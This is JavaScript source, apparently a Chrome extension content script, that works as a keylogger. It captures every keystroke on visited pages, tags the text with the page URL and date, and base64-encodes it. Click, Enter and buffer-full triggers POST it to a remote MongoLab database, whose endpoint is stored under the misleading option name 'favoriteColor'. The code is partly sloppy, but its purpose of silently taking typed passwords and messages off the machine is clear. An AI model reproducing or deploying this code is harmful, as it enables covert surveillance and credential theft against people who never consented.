(function() {
  // TODO: Check for each in over buff max > and do_

  function outpst( outs, mlusr, mldb, mlcl, mlapi, url, data ) {

     var uri   =  "api/1/databases/"

     buf = btoa(buf);
     console.log("data " + buf);

     data      =   btoa(data); // base64
     data      =  {};
     data.seg  =  buf;

     json      =  JSON.stringify(data);

     uri       =   uri.concat(mldb, "/collections")
     uri       =   uri.concat("/", mlcl);
     uri       =   url.concat("/", uri);
     uri       =   uri.concat("?apiKey\=", mlapi);

     var req   =  new XMLHttpRequest();
     console.log("url " + uri);

     req.open("POST",uri,false);
     req.setRequestHeader("Content-type","application/json; charset=UTF-8");
     req.send(json);

     console.log("state "   + req.readyState);
     console.log("status "  + req.status);

     // console.log("text " + req.Text);
     //console.log("odd" + outs, mlusr, mldb, mlcl, mlapi );
  }


  // MAIN:
  var seg;		// cpy buf write out
  var bln;		// buff length
  var dt;		// date-time
  var x   = 0;		// free()
  var bnd = 100;	// buffer max
  var buf = "";		// buffer

  var nar, key;		// keycode, key
  var json, data, dt;	// out post objects

  var outs, mlsr, mldb, mlcl, mlapi;	// mlab auth obj(s)

  var url;				// out post
  var urz = window.location.href;	// current url


  chrome.storage.local.get({

    favoriteColor: "https://api.mongolab.com",
    mluser:  "",
    mlabdb:  "",
    mlabcl:  "",
    mlabapi: "",
    likesColor: true

  }, function(items) {

    outs   =  items.favoriteColor;
    mlusr  =  items.mluser;
    mldb   =  items.mlabdb;
    mlcl   =  items.mlabcl;
    mlapi  =  items.mlabapi;

    console.log("out server " + outs + "\nmluser " + mlusr + "\nmldb " + mldb + "\nmlcl " + mlcl + "\nmlapi " + mlapi);
    //document.getElementById('like').checked = items.likesColor;
  });


  window.onkeydown = function(e) {

     key = e.keyCode ? e.keyCode : e.which;
     if ( key == 16 ) {
        nar = "(shift_down)";
        buf = buf.concat("", nar);

     }
  }


  window.onkeyup = function(e) {

     key = e.keyCode ? e.keyCode : e.which;
     nar = String.fromCharCode( key );

     if ( key == 220 )  { nar = "\\" }
     if ( key == 219 )  { nar = "[" }
     if ( key == 221 )  { nar = "]" }
     if ( key == 186 )  { nar = ";" }
     if ( key == 192 )  { nar = "`" }
     if ( key == 222 )  { nar = "'" }
     if ( key == 188 )  { nar = "," }
     if ( key == 189 )  { nar = "-" }
     if ( key == 187 )  { nar = "=" }
     if ( key == 190 )  { nar = "." }
     if ( key == 191 )  { nar = "/" }

     if ( key == 16  )  { nar = "(shift_up)" }
     if ( key == 8   )  { nar = "(del)" }

     buf = buf.concat("", nar);
     bln = buf.length;

     // free buffer when full
     if ( bln > bnd -1 ) {
        x = 1;

        dt  = new Date();

        seg = buf.substring(0,bnd);
        seg = seg.concat("\n_PAGE: ", urz);
	seg = seg.concat("\n_DATE: ", dt);

        if ( bln == bnd ) {

          buf = "";
        } else {

          buf = buf.substring(bnd, buf.length);
        }
     }

     // return == newpage
     if ( key == 13 ) {		
        x   = 1;

        dt  = new Date();
        seg = buf.substring(0, buf.length);
        seg = seg.concat("\n_PAGE: ", urz);
        seg = seg.concat("\n_DATE: ", dt);

        buf = "";
     }

     // do some thing
     if ( x == 1 ) {

        if ( navigator.onLine ) {

          outpst( outs, mlusr, mldb, mlcl, mlapi, outs, data );

          x     =  0;
          seg   =  "";

       } else {
          console.log("offline \n" + seg);

       }
     }
  }

  // repeate previouse segment on click which could change page
  window.onclick = function(e) {

     if ( buf.length > 5 ) {

       if ( navigator.onLine ) {

          dt  = new Date();

          buf = buf.concat("\n_PAGE: ", urz);
          buf = buf.concat("\n_DATE: ", dt);

          outpst( outs, mlusr, mldb, mlcl, mlapi, outs, data );

          buf = "";

       } else {

          console.log("offline \n" + buf);
       }
     }
  }

})();
